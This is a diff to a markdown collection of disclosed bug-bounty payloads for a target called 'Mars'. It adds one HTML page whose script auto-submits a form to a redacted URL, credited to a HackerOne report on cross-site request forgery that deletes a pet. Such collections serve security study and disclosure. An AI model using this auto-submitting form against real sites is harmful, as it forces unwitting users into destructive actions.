@@ -1,6 +1,23 @@
 # Mars
 
-1 payloads.
+2 payloads.
+
+### `375dd962`
+
+```
+<html>
+  <body>
+    <form action="████">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+— [CSRF to delete a pet](https://hackerone.com/reports/2029753) · Mars · [d0rift](https://hackerone.com/d0rift)
 
 ### `85a681cd`
 
